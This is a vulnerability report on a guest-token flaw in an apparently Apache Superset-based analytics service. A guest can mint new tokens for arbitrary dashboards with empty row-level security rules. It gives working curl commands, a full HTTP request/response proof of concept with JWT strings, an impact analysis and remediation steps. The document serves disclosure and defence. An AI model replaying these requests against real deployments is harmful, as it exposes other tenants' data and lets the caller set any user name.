# Guest Token Can Mint Arbitrary Tokens: Dashboard Scope Bypass and Row-Level Security Bypass

**Severity:** Critical — CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (9.3)
**Class:** CWE-269 — Improper Privilege Management
**Target:** `POST /api/v1/security/guest_token/` on `bi.trustpoint.ai`
**Status:** Confirmed (token minting, RLS bypass, and cross-dashboard scoping all verified)

---

## Summary

The Superset `EMBEDDED DASHBOARD ACCESS` role grants `can_grant_guest_token` to guest users. A guest token — intended for read-only access to a single dashboard with Row Level Security (RLS) — can call `POST /api/v1/security/guest_token/` to mint new guest tokens scoped to **any dashboard** with **no RLS rules**. This bypasses both the dashboard-scoping authorization model and the row-level security that restricts data to the user's company.

---

## Steps to Reproduce

### Step 1 — Authenticate and obtain guest token

Log in to `partner.trustpoint.ai` as any user (Investor, Borrower, etc.) and navigate to the BI analytics page. The embedded dashboard loads with a guest token. Capture the token from the `X-Guesttoken` request header in browser DevTools (Network tab).

The original token is scoped to **one dashboard** with **company-specific RLS**:

```json
{
  "resources": [{"type": "dashboard", "id": "ea095d5e-d7a0-498f-aaa4-e00a2a5a14d5"}],
  "rls_rules": [{"clause": "user_company_ids::jsonb ? '349823e1-322f-4dff-ac4a-b7d915b86875'"}],
  "type": "guest"
}
```

### Step 2 — Confirm guest has token-minting permission

```bash
curl -s 'https://bi.trustpoint.ai/api/v1/me/roles/' \
  -H 'X-Guesttoken: <guest_token>' \
  -H 'Cookie: session=<session_cookie>'
```

**Result:** `200 OK` — Role `EMBEDDED DASHBOARD ACCESS` includes:
```json
["can_grant_guest_token", "SecurityRestApi"]
```

### Step 3 — Mint a new token for a different dashboard with NO RLS

```bash
curl -X POST 'https://bi.trustpoint.ai/api/v1/security/guest_token/' \
  -H 'X-Guesttoken: <guest_token>' \
  -H 'Cookie: session=<session_cookie>' \
  -H 'Content-Type: application/json' \
  -d '{
    "user": {"first_name": "Attacker", "last_name": "User"},
    "resources": [{"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"}],
    "rls": []
  }'
```

**Result:** `200 OK` — New token returned:
```json
{"token": "eyJhbGciOiJIUzI1NiIs...n1dYQnJwAzIhwiEH-PB3vN-ZF7j4tFalYpGOa9YrwnY"}
```

### Step 4 — Verify the minted token payload

Decoding the minted token confirms:
- Scoped to a **different dashboard** (Sales & Client Engagement — an internal dashboard)
- **Zero RLS rules** — no company filtering applied

```json
{
  "user": {"first_name": "Attacker", "last_name": "User"},
  "resources": [{"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"}],
  "rls_rules": [],
  "exp": 1792070942.2743933,
  "type": "guest"
}
```

### Step 5 — Verify minted token is functional

```bash
curl -s 'https://bi.trustpoint.ai/api/v1/dashboard/?q=(page_size:5)' \
  -H 'X-Guesttoken: <minted_token>'
```

**Result:** `200 OK` — The minted token is fully functional.

### Step 6 — Mint multi-dashboard token (escalation)

```bash
curl -X POST 'https://bi.trustpoint.ai/api/v1/security/guest_token/' \
  -H 'X-Guesttoken: <guest_token>' \
  -H 'Content-Type: application/json' \
  -d '{
    "user": {"first_name": "Full", "last_name": "Access"},
    "resources": [
      {"type": "dashboard", "id": "cc1bbd9f-09b7-4487-91ec-4a973cabd3db"},
      {"type": "dashboard", "id": "a4beef05-63e0-45ea-8612-38881fa7058c"},
      {"type": "dashboard", "id": "a35e07f8-89f1-488c-ae39-863564bb1b1f"},
      {"type": "dashboard", "id": "bd98f9b3-6983-40a4-8eb5-ec9de9d30224"},
      {"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"}
    ],
    "rls": []
  }'
```

**Result:** `200 OK` — Returns a valid token scoped to **5 dashboards simultaneously** with **no RLS**.

---

## Proof of Concept

### Request

```http
POST /api/v1/security/guest_token/ HTTP/2
Host: bi.trustpoint.ai
X-Guesttoken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImZpcnN0X25hbWUiOiJQZW50ZXN0IiwibGFzdF9uYW1lIjoiSW52ZXN0b3IgMiAzIn0sInJlc291cmNlcyI6W3sidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiZWEwOTVkNWUtZDdhMC00OThmLWFhYTQtZTAwYTJhNWExNGQ1In1dLCJybHNfcnVsZXMiOlt7ImNsYXVzZSI6InVzZXJfY29tcGFueV9pZHM6Ompzb25iID8gJzM0OTgyM2UxLTMyMmYtNGRmZi1hYzRhLWI3ZDkxNWI4Njg3NScifV0sImlhdCI6MTc5MjA2NjY3OC44OTk2MjM5LCJleHAiOjE3OTIwNzAyNzguODk5NjIzOSwiYXVkIjoiaHR0cDovL3N1cGVyaW9uLWFwcDo4MDg4LyIsInR5cGUiOiJndWVzdCJ9.OpCfx45AZH3max_ruPy-bbfrbya2oWvX-sGfnKaUTsw
Cookie: session=<redacted>
Content-Type: application/json

{
  "user": {"first_name": "Attacker", "last_name": "User"},
  "resources": [{"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"}],
  "rls": []
}
```

### Response

```http
HTTP/2 200 OK
Content-Type: application/json

{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImZpcnN0X25hbWUiOiJBdHRhY2tlciIsImxhc3RfbmFtZSI6IlVzZXIifSwicmVzb3VyY2VzIjpbeyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiIyMjljNWIzYi1hN2UzLTRhMDYtYTM1Yi1kYTZjZjdmMDU1NjIifV0sInJsc19ydWxlcyI6W10sImlhdCI6MTc5MjA2NzM0Mi4yNzQzOTMzLCJleHAiOjE3OTIwNzA5NDIuMjc0MzkzMywiYXVkIjoiaHR0cDovL3N1cGVyaW9uLWFwcDo4MDg4LyIsInR5cGUiOiJndWVzdCJ9.n1dYQnJwAzIhwiEH-PB3vN-ZF7j4tFalYpGOa9YrwnY"
}
```

### Comparison: Original vs Minted Token

| Property | Original Token | Minted Token |
|----------|---------------|--------------|
| Dashboard scope | 1 dashboard (assigned) | Any dashboard (attacker-chosen) |
| RLS rules | `user_company_ids::jsonb ? '<company_id>'` | `[]` (empty — no filtering) |
| User identity | Real user name | Attacker-controlled |
| Functional | Yes | Yes (verified) |

---

## Impact

- **Dashboard scope bypass:** An attacker can mint tokens for dashboards they were never assigned, including internal dashboards (Sales & Client Engagement, DSCR Portfolio Analytics, Budget Benchmarking, etc.)
- **Row-level security bypass:** Minted tokens have `rls_rules: []`, removing the company-level data filtering that restricts which rows a user can see. The original token's RLS clause (`user_company_ids::jsonb ? '<company_id>'`) is entirely absent
- **Arbitrary identity:** The attacker controls the `user` field in the minted token, allowing impersonation of any name in audit logs and dashboards
- **Multi-dashboard escalation:** A single minting call can scope the new token to multiple dashboards simultaneously, scaling the breach
- **Persistent abuse:** Each minted token is valid for ~1 hour. The attacker can continuously re-mint tokens as long as they have any valid guest token, creating an indefinite access chain

---

## Remediation

1. **Remove `can_grant_guest_token` from the `EMBEDDED DASHBOARD ACCESS` role** — guest users must never mint new tokens. This permission should be restricted to the backend service account that issues tokens during the embedded dashboard initialization flow
2. **Add server-side validation** to the guest token endpoint: if the caller is a guest token, reject the request (guests should not be able to create other guests)
3. **Enforce RLS inheritance** — if a caller has RLS rules, any token it creates must inherit at least the same restrictions (never fewer)

---

## References

- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [OWASP API5:2023 — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [Apache Superset Guest Token Security](https://superset.apache.org/docs/security/#guest-token)
